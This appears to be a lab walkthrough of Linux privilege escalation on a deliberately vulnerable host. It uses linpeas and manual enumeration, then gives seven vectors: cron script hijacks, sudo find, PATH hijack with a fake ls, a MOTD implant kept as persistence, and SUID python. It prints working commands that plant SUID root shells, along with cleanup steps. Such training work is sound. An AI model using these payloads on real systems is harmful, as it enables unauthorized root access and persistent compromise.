# Linux Privilege Escalation

## Phase 0: Foothold & Enumeration

### Connecting to the Remote Host

```bash
ssh -p 10019 bthomas@192.168.3.205
```

<img width="347" height="63" alt="SSH connection" src="https://github.com/user-attachments/assets/841367df-277e-4eb5-a9cb-9490c16d5b52" />

### Initial Foothold Enum

First thing after landing on a host is to establish who you are and what you are allowed to run as root.

```bash
id          # user, groups, uid/gid
sudo -l     # commands you may run via sudo
```

<img width="1031" height="156" alt="id and sudo -l output" src="https://github.com/user-attachments/assets/7260cf38-de8d-4e75-afa5-d5c21a7fd0f8" />

### Transferring linpeas.sh to the Target

Push linpeas from the Kali VM to the target over SSH:

```bash
# On Kali, from the directory containing linpeas.sh:
scp -P 10019 linpeas.sh bthomas@192.168.3.205:/tmp/
```

Confirm it transferred and is executable. Add the execute bit if needed:

```bash
ls -la /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh      # only if it is not already executable
```

Run it and tee the output to a file. This method maintains colored output:

```bash
bash /tmp/linpeas.sh &> /tmp/linpeas.out    # &> captures stdout and stderr
less -R /tmp/linpeas.out                    # -R renders ANSI colors
```

---

### Automated Enumeration (linpeas Findings)

linpeas surfaced the following. Each maps to one of the lab's exploitation vectors.

#### SUID Binaries (V7: SUID Python)
Found under **"Files with Interesting Permissions."** Note `/opt/lab/bin/python3`.

<img width="692" height="32" alt="SUID binaries" src="https://github.com/user-attachments/assets/c0cf7e64-eabc-4215-b22b-32e1187cc9da" />

#### Writable Directory and Files (V1 / V3 / V4 / V5 / V6)
Found under the permissions section.

<img width="933" height="71" alt="Writable directory" src="https://github.com/user-attachments/assets/d29556b7-7d3a-460d-bfdc-aee86c37ceb6" />

<img width="996" height="123" alt="Writable files" src="https://github.com/user-attachments/assets/15829ffd-6a88-4bb0-84da-98964793c369" />

#### Cron Jobs (V1 / V3 / V4)
Found under **"Check for vulnerable cron jobs under /etc/cron.d."**

<img width="475" height="52" alt="Cron jobs" src="https://github.com/user-attachments/assets/8c7db8f7-3d38-4632-b989-c5f061ec9aa8" />

#### sudo Permissions (V2: sudo find wildcard)
Found under **"sudo -l, /etc/sudoers, and /etc/sudoers.d."**

<img width="446" height="47" alt="sudo permissions" src="https://github.com/user-attachments/assets/ee7958d8-7d80-4260-9655-7b744f2f149f" />

#### Writable PATH Entry (V5: PATH hijack)
Found under **"Files (scripts) in /etc/profile.d/."** A world-writable dir prepended to root's PATH.

<img width="446" height="35" alt="Writable PATH" src="https://github.com/user-attachments/assets/28928567-d2ab-4a4f-9cb1-275419d37746" />

---

### Manual Enumeration and Confirmation

The commands below reproduce and confirm linpeas's findings by hand. Useful both as a cross-check and for understanding why each item is a finding.

#### User context and sudo rights
```bash
id
sudo -l
```
Shows the current user, group memberships, and what may be run as root.

<img width="1021" height="132" alt="id and sudo -l" src="https://github.com/user-attachments/assets/69c0a6aa-a5d3-47d5-9935-ba2a5c84d456" />

#### SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```
Lists every SUID binary. Note the out-of-place `/opt/lab/bin/python3`.

<img width="493" height="452" alt="find SUID" src="https://github.com/user-attachments/assets/46bece36-cdad-453a-88ab-a6bbbd20d165" />

#### Root-scheduled cron jobs
```bash
ls -la /etc/cron.d/ /etc/crontab
```
Lists the cron definition files root runs.

<img width="445" height="234" alt="ls cron.d" src="https://github.com/user-attachments/assets/608abf94-86ff-4de0-a898-f141184b669e" />

```bash
grep -R "" /etc/cron.d/ 2>/dev/null
```
Prints the contents of each cron file. Note `/opt/lab/bin/backup.sh`.

<img width="1222" height="506" alt="grep cron.d" src="https://github.com/user-attachments/assets/e9f09c72-9956-4d69-acf3-a317e951f6df" />

#### Writable directories
```bash
find /opt /usr/local /etc -writable -type d 2>/dev/null
```
Directories the current user can write to.

<img width="605" height="62" alt="writable dirs" src="https://github.com/user-attachments/assets/5b393112-04c5-43c2-a158-7511643bac35" />

#### Writable root-owned files
```bash
find /opt /etc -writable -type f 2>/dev/null
```
Files the current user can modify that root relies on.

<img width="505" height="57" alt="writable files" src="https://github.com/user-attachments/assets/ce7a0a1e-c695-4d04-a94d-35ad3d639d4b" />

#### PATH manipulation
```bash
cat /etc/profile.d/*.sh
```
Most output is the default. However, the critical line is the last one:

```bash
export PATH="/opt/lab/bin:$PATH"
```

This prepends the world-writable `/opt/lab/bin` to PATH for every login shell, which includes root's.

<img width="295" height="25" alt="writable PATH line" src="https://github.com/user-attachments/assets/e6e0018e-5de2-41e0-b7e9-db4f0d314d7b" />

---

## V1 - Writable Directory + Root Cron (Script Hijack)

First, lets run some confirmation commands to make sure the file and permissions are correct:

```bash
cat /etc/cron.d/lab-backup
ls -la /opt/lab/bin/
```

<img width="442" height="118" alt="image" src="https://github.com/user-attachments/assets/9330f965-d710-4b2d-bdea-ddbc1b00e751" />

Now lets see what the original backup.sh has in it with `cat /opt/lab/bin/backup.sh`. This shows the following (saved here for easy copy and paste to restore the original when done):

```bash
#!/bin/bash
echo "backup done" > /tmp/backup.log
```

Now we just need to replace the contents with the following:

```bash
cat > /opt/lab/bin/backup.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
```

Then wait 5 min before running the following to confirm escalation:

```bash
/tmp/rootshell -p
id
```

<img width="654" height="85" alt="image" src="https://github.com/user-attachments/assets/c4ef3602-6b0b-4477-b509-91ce0d60a7ef" />

### A Note on uid vs euid

The SUID-bash vectors leave real uid intact and only flip euid to 0, so id shows uid=1004 euid=0. V7's setuid(0) drops real, effective, and saved uids to 0, so id shows a clean uid=0. V2 is root from the start via sudo.

### Clean Up

From the rootshell, restore the original script:

```bash
cat > /opt/lab/bin/backup.sh <<'EOF'
#!/bin/bash
echo "backup done" > /tmp/backup.log
EOF
```

Then remove the shell and exit:

```bash
rm -f /tmp/rootshell
exit
```

---

## V2 - sudo NOPASSWD Wildcard Command (find)

Confirm the vuln:

```bash
sudo -l
```

<img width="1016" height="140" alt="image" src="https://github.com/user-attachments/assets/600aa805-9dfe-4f28-80f5-cf4116f4f2ed" />

Exploit:

```bash
sudo /usr/bin/find /opt/lab/tools/ -exec /bin/bash -p \;
id
```

<img width="610" height="70" alt="image" src="https://github.com/user-attachments/assets/c55dfa6e-83ee-44b6-9534-3e60760a4be3" />

### Clean Up

Just `exit` the root shell when done.

---

## V3 - World-Writable Root Cron Script

Confirmation checks:

```bash
ls -la /opt/lab/scripts/rotate.sh
cat /etc/cron.d/lab-rotate
find / -perm -0002 -type f 2>/dev/null | grep -v -E '^/(proc|sys|dev|run|tmp|var/tmp)'
```

<img width="834" height="362" alt="image" src="https://github.com/user-attachments/assets/f0d52025-2a1e-4ead-b797-b9d31d14fce6" />

### Exploitation

Overwrite the rotate.sh file with:

```bash
cat > /opt/lab/scripts/rotate.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
```

Wait 5 min then:

```bash
/tmp/rootshell -p
id
```

<img width="659" height="84" alt="image" src="https://github.com/user-attachments/assets/363cf378-83a9-41aa-b194-20f424a1180c" />

### Clean Up

Same idea as V1. From the rootshell, restore the original script, then remove the shell:

```bash
cat > /opt/lab/scripts/rotate.sh <<'EOF'
#!/bin/bash
echo "rotate done" > /tmp/rotate.log
EOF
rm -f /tmp/rootshell
exit
```

---

## V4 - Missing Binary on a Writable Path

Confirm the vuln. Note the lack of the file is what we want:

```bash
cat /etc/cron.d/lab-agent
ls -la /opt/lab/bin/agent
ls -ld /opt/lab/bin
```

<img width="546" height="127" alt="image" src="https://github.com/user-attachments/assets/18cb558b-3d3e-4608-b10d-af50c6f1b17d" />

Create the expected file with a payload. The `chmod +x` is required here because the file is brand new and starts with no execute bit:

```bash
cat > /opt/lab/bin/agent <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
chmod +x /opt/lab/bin/agent
```

<img width="458" height="83" alt="image" src="https://github.com/user-attachments/assets/7c66fc89-86d1-4cb5-851e-61edbc172c96" />

Wait 5 min then confirm exploitation:

```bash
/tmp/rootshell -p
id
```

<img width="646" height="126" alt="image" src="https://github.com/user-attachments/assets/e0903dc0-0e2e-43ac-93b2-cc9a488c74f0" />

### Clean Up

There is no original to restore because the file never existed. Delete the planted binary and the shell from the rootshell:

```bash
rm -f /tmp/rootshell /opt/lab/bin/agent
exit
```

<img width="332" height="49" alt="image" src="https://github.com/user-attachments/assets/abe44eae-37a4-4088-b01b-9096c08429d6" />

---

## V5 - Root PATH Hijack (profile.d)

Confirm the vuln:

```bash
cat /etc/profile.d/lab-path.sh
echo $PATH
ls -ld /opt/lab/bin
```

<img width="896" height="131" alt="image" src="https://github.com/user-attachments/assets/966fcf08-1899-473b-8d47-fbed2b55dc66" />

Insert a fake `ls`. The `exec /usr/bin/ls "$@"` line hands off to the real `ls` so the command still behaves normally:

```bash
cat > /opt/lab/bin/ls <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
exec /usr/bin/ls "$@"
EOF
chmod +x /opt/lab/bin/ls
```

<img width="458" height="121" alt="image" src="https://github.com/user-attachments/assets/ebe4fa95-95a8-499e-855e-a96f866f1d97" />

Exploitation proof. This fires on the next root login shell:

```bash
/tmp/rootshell -p
id
```

<img width="644" height="168" alt="image" src="https://github.com/user-attachments/assets/f11cba94-ebd3-40ba-b30f-bf919c3300ed" />

### Clean Up

Delete the fake `ls` and the shell:

```bash
rm -f /tmp/rootshell /opt/lab/bin/ls
exit
```

<img width="306" height="66" alt="image" src="https://github.com/user-attachments/assets/5e719bbb-7f57-49f8-a1fa-545a5f36a768" />

---

## V6 - World-Writable MOTD Directory

Confirm:

```bash
ls -ld /etc/update-motd.d/
ls -la /etc/update-motd.d/
```

<img width="908" height="312" alt="image" src="https://github.com/user-attachments/assets/2c9cf494-0c46-4edd-a0b4-be68e5f7c547" />

Insert the malicious script. The `99-` prefix makes it run after the stock scripts:

```bash
cat > /etc/update-motd.d/99-lab-pwn <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
EOF
chmod +x /etc/update-motd.d/99-lab-pwn
```

<img width="505" height="120" alt="image" src="https://github.com/user-attachments/assets/0e3859df-18f0-43c6-86ea-b7a42f1a82ca" />

### Exploit

Login to the remote target, which triggers the MOTD scripts as root, then run the rootshell:

```bash
ssh -p 10019 bthomas@192.168.3.205
ls -la /tmp/rootshell
/tmp/rootshell -p
id
```

<img width="648" height="172" alt="image" src="https://github.com/user-attachments/assets/9ddff023-7145-4607-9755-21a52bafcd6c" />

### Clean Up

The script re-fires on every login until removed so it doubles as persistence. Delete the implant and the shell:

```bash
rm -f /tmp/rootshell /etc/update-motd.d/99-lab-pwn
exit
```

<img width="415" height="83" alt="image" src="https://github.com/user-attachments/assets/953f50f4-3521-4378-968d-bcd819389003" />

---

## V7 - SUID Python Binary

Confirm the vuln:

```bash
find / -perm -4000 -type f 2>/dev/null
```

<img width="528" height="499" alt="image" src="https://github.com/user-attachments/assets/2b26683d-9781-44fa-9d38-0bedea61c249" />

Note the `s` bit set in the screenshot below:

```bash
ls -la /opt/lab/bin/python3
```

<img width="544" height="71" alt="image" src="https://github.com/user-attachments/assets/2a530c5c-c51b-4afa-b9f8-1f12213c2485" />

Exploit:

```bash
/opt/lab/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
```

<img width="734" height="68" alt="image" src="https://github.com/user-attachments/assets/ef17a392-39da-42d8-ab20-cff626cfc995" />

Unlike the SUID bash vectors, `id` here reads the full `uid=0(root)` and not just `euid=0`. This is because `os.setuid(0)` promotes the real uid to 0 as well. See the uid vs euid note under V1.

### Clean Up

Just `exit` when done.

---

## Final Lab Cleanup Check

Confirm the entire lab is clean and back to its starting state:

```bash
ls -l /tmp/rootshell /tmp/pwned_* 2>/dev/null
ls -la /etc/update-motd.d/99-lab-pwn 2>/dev/null
ls -la /opt/lab/bin/agent /opt/lab/bin/ls 2>/dev/null
cat /opt/lab/bin/backup.sh
cat /opt/lab/scripts/rotate.sh
```

The first three should return nothing. The last two should show the benign original scripts.

<img width="551" height="166" alt="image" src="https://github.com/user-attachments/assets/01354558-83a1-4d8e-b0d9-175f7edacd69" />

Remove any leftover tools and log files created:

```bash
rm -f /tmp/linpeas.sh /tmp/linpeas.out /tmp/linpeas_host_checker_* /tmp/backup.log /tmp/rotate.log
```
